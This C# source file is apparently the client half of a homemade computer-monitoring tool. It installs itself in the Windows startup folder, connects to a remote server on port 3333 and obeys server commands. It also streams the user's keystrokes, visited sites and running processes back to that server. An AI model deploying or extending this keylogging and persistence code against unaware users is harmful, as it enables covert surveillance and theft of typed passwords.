using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using IWshRuntimeLibrary;
using System.Linq;
using System.Runtime.CompilerServices;

namespace ClientSide
{

    public delegate void wordFromKeylogger(string word);
    public delegate void SiteFromMonitorSite(string word);
    public delegate void updateProccess(string proccess);
    class Program
    {

        const string ID = "id";
        const string SETTING = "setting";
        const string LIVE = "get current state";
        const string STOP_LIVE = "stop current state";
        const string REMOVE_CLIENT = "remove client";
        private String id;
        private Socket clientSocket;
        private String name;
        private String ip;
        private Byte[] buffer;
        private DBclient dbs;
        private Setting set;
        private ClientForm clientForm;
        public Boolean sendCurrentData;      
        string keyDate;
        public static Program program;
        ManageMonitor manageMonitor;



        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            // sqliteForm sf = new sqliteForm();
            // sf.ShowDialog();

            // Set up the software that will work when you turn on the computer           
            connectAtReStartComputer();

            program = new Program();
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

          
            // check if connect at first time or reconnect         
            if (!program.initialClient())
            {
                program.connectToServer();
            }
            
            Application.Run();
        }

        private static void connectAtReStartComputer()
        {
            // The path to the key where Windows looks for startup applications
            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            
            string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            WshShell shell = new WshShell();
            string shortcutAddress = startupFolder + @"\MyStartupShortcut.lnk";
            IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(shortcutAddress);
            shortcut.Description = "A startup shortcut. If you delete this shortcut from your computer, LaunchOnStartup.exe will not launch on Windows Startup"; // set the description of the shortcut
            shortcut.WorkingDirectory = Application.StartupPath; /* working directory */
            shortcut.TargetPath = Application.ExecutablePath; /* path of the executable */
            shortcut.Save(); // save the shortcut 
            shortcut.Arguments = "/a /c";


            // if (rkApp.GetValue("ClientSide.exe") == null) { }
            // Remove the value from the registry so that the application doesn't start
            //  else 
            //  rkApp.DeleteValue("ClientSide.exe", false);

        }



        // The function is activated as soon as data is received in the socket
        private void ReceiveCallback(IAsyncResult AR)
        {

            try
            {
                clientSocket = AR.AsyncState as Socket;
                int received = clientSocket.EndReceive(AR);
                if (received == 0)
                {
                    return;
                }

                string data = Encoding.ASCII.GetString(buffer);            

                var dataFromServer = data.Split(new[] { '\r', '\n', '\0' }, 2);
              //  ShowErrorDialog("server send: |" + dataFromServer[0].Split('\0')[0] + "|");
                
                // dataFromServer[0] contain request subject from server side
                // in switch the request sent to handler function
                switch (dataFromServer[0])
                {
                    // Get uniqe id 
                    case ID:                    
                        id = dataFromServer[1].Split('\r', '\n', '\0')[0];
                        ShowErrorDialog("get id"); 
                        break;

                    // Get Setting to implement monitoring
                    case SETTING: 
                        string setting = dataFromServer[1].Split('\0')[0];
                        setting = setting.Substring(setting.IndexOf("\n") + 1);
                        // save setting 
                        saveSettingFile(setting);
                        playAllTrigers(); //This method obtains the settings string from the server
                        break;

                    // Launch the software in live reporting mode
                    case LIVE:
                        liveMode(clientSocket);// sara 
                        break;

                    // Stop live reporting mode
                    case STOP_LIVE:
                       // ShowErrorDialog("server send: |" + dataFromServer[0].Split('\0')[0] + "|");
                        stopLiveMode(clientSocket);
                        break;

                    // Remove computer from monitoring
                    case REMOVE_CLIENT:
                        removeClient();
                        break;

                    default:
                        //ShowErrorDialog("server send: |" + dataFromServer[0].Split('\0')[0] + "|");
                        break;
                }
                                      
                buffer = new byte[clientSocket.ReceiveBufferSize];
                clientSocket.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, ReceiveCallback, clientSocket);
            }
             
            catch (SocketException ex)
            {
                ShowErrorDialog(ex.Message);
            }
            catch (ObjectDisposedException ex)
            {
                ShowErrorDialog(ex.Message);
            }
        }

        private void removeClient()
        {
            // set setting file
            // db
            // restart
            // turn off all theards 
            ShowErrorDialog("removeeeeeeeeeeee");

        }


        private void stopLiveMode(Socket clientSocket)
        {

            sendCurrentData = false;
            //  monitorProccess.ifLive = false;
            //ShowErrorDialog("stop send current state");
            manageMonitor.stopLiveMode();
        }

        private void liveMode(Socket socket)
        {
            sendCurrentData = true;
            SendData(socket, "current state\ropen CurrentState form");
            manageMonitor.playLiveMode();


        }

        // set setting and here will play all triggers;
        private void playAllTrigers()
        {          
           
            //ShowErrorDialog("play all trigers");

            // Play all monitors
            manageMonitor = new ManageMonitor();
            manageMonitor.playAllTriggers();

            // Set Report
            Report.setReportFrequency();
        }

        private void saveSettingFile(string setting)
        {
            string userName = Environment.UserName;


            String projectDirectory = Environment.CurrentDirectory;
            string filepath = Directory.GetParent(projectDirectory).Parent.FullName;


            String[] paths = new string[] { @filepath, "files" };
            filepath = Path.Combine(paths);
           
            if (!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }

            String settingFile = Path.Combine(filepath, "setting_" + userName + ".txt");
            if (System.IO.File.Exists(settingFile))
            {
                System.IO.File.Delete(settingFile);
               
            }
            using (StreamWriter sw = System.IO.File.CreateText(settingFile));
            System.IO.File.WriteAllText(settingFile, name + "\r\n" + id + "\r\n" + setting);


            // play Reporting scheduling
            Report.setReportFrequency();
        }

        // Defines functions for sending and receiving data through the socket
        private void ConnectCallback(IAsyncResult AR)
        {

            try
            {
                clientSocket = AR.AsyncState as Socket;
                clientSocket.EndConnect(AR);
                clientSocket.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, ReceiveCallback, clientSocket);

               // ShowErrorDialog("in ConnectCallback in socket: " + clientSocket.RemoteEndPoint);
                if (id != null)
                    SendData(clientSocket, "id\r" + id);
                else SendData(clientSocket, "name\r" + name);

            }
            catch (SocketException ex)
            {
                // ShowErrorDialog("ConnectCallback send SocketException\r\n" + ex.Message);

                reConnect();

            }
            catch (ObjectDisposedException ex)
            {
                ShowErrorDialog("ConnectCallback send ObjectDisposedException \r\n" + ex.Message);
            }
        }

        // A method that sends information to a server
        private void SendCallback(IAsyncResult AR)
        {
            try
            {
                clientSocket = AR.AsyncState as Socket;
                clientSocket.EndSend(AR);
            }
            catch (SocketException ex)
            {
                ShowErrorDialog("SendCallback send SocketException\r\n" + ex.Message);
            }
            catch (ObjectDisposedException ex)
            {
                ShowErrorDialog("SendCallback send ObjectDisposedException \r\n" + ex.Message);
            }
        }

        private static void ShowErrorDialog(string message)
        {
            MessageBox.Show(message, Application.ProductName, MessageBoxButtons.OK, MessageBoxIcon.Error);
        }


        public void connectToServer()
        {
            try
            {

                clientForm = new ClientForm();
                Thread openClientForm = new Thread(openClientFormDialog);
                openClientForm.SetApartmentState(ApartmentState.STA);
                openClientForm.Start();

                while (openClientForm.IsAlive) ;

                name = clientForm.clientName;
                ip = clientForm.ip; 
               

                // Create new socket 
                clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                buffer = new byte[clientSocket.ReceiveBufferSize];

                // Connect To Server 
                IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(ip), 3333);
                // The function ConnectCallback set callback to receive and send 
                clientSocket.BeginConnect(endPoint, ConnectCallback, clientSocket);
                ShowErrorDialog("connect to ip: " + ip);
            }
            catch (SocketException ex)
            {
                ShowErrorDialog("connectToServer send SocketException\r\n" + ex.Message);
            }
            catch (ObjectDisposedException ex)
            {
                ShowErrorDialog("connectToServer send ObjectDisposedException\r\n" + ex.Message);
            }


        }


        private bool initialClient()
        {

            string set = "";
            string projectDirectory = Environment.CurrentDirectory;
            string filepath = Directory.GetParent(projectDirectory).Parent.FullName;
            string[] paths = new string[] { @filepath, "files" };
            filepath = Path.Combine(paths);
            
            DirectoryInfo directory = new DirectoryInfo(filepath);//Assuming Test is your Folder
            //ShowErrorDialog("filepath is: \n" + filepath);
            string fileName = "setting_" + Environment.UserName + ".txt";
            if (Directory.Exists(filepath) && System.IO.File.Exists(Path.Combine(filepath, fileName)))
            { 
                
                using (StreamReader sr = System.IO.File.OpenText(Path.Combine(filepath, fileName)))
                {
                    name = sr.ReadLine();
                    id = sr.ReadLine();
                    ip = "127.1.0.0";
                    
                    string line = "";
                    while ((line = sr.ReadLine()) != null)
                    {
                        //ShowErrorDialog("line\n" + line);
                        set += line + "\r\n";
                    }
                }
                reConnect();
                playAllTrigers();
                
                return true;
            }

             
            return false;

        }

        private void openClientFormDialog()
        {
            clientForm.ShowDialog();
        }



        public void SendData(Socket clientSocket, String data)
        {
            try
            {
                //ShowErrorDialog("send: \r\n" + data);
                var sendData = Encoding.UTF8.GetBytes(data);
                clientSocket.BeginSend(sendData, 0, sendData.Length, SocketFlags.None, SendCallback, clientSocket);

            }
            catch (SocketException ex)
            {
                //ShowErrorDialog("SendData send SocketException\r\n" + ex.Message);
                reConnect();
                //SendData(clientSocket, data);
            }
            catch (ObjectDisposedException ex)
            {
                ShowErrorDialog("SendData send ObjectDisposedException \r\n" + ex.Message);
            }
        }

        public void reConnect()
        {
            try
            {

                // Create new socket 
                clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                buffer = new byte[clientSocket.ReceiveBufferSize];

                //ShowErrorDialog("reConnect in socket: " + clientSocket.RemoteEndPoint);
                // Connect To Server 
                IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(ip), 3333);
                // The function ConnectCallback set callback to receive and send 
                clientSocket.BeginConnect(endPoint, ConnectCallback, clientSocket);
            }
            catch (SocketException ex)
            {
                //ShowErrorDialog("reConnect send SocketException\r\n" + ex.Message);

            }
            catch (ObjectDisposedException ex)
            {
               // ShowErrorDialog("reConnect send ObjectDisposedException \r\n" + ex.Message);
            }
        }

        public static void updateCurrentKeylogger(string word)
        {           
             
                //ShowErrorDialog(word);
                program.SendData(program.clientSocket, "current state\rkeyBoard\r"+ word);
             
           
        }

        public static void updateCurrentSite(string site)
        {
            // ShowErrorDialog("send site: \n"+site);
            //Console.WriteLine(site); 
            program.SendData(program.clientSocket, "current state\rsite\r" + site);
          
           

        }
       
        public static void updateCurrentProcess(string proccess)
        {
               // ShowErrorDialog("send proc: \n" + proccess);
                program.SendData(program.clientSocket, "current state\rprocesses\r" + proccess);
          
            

        }


    }
}
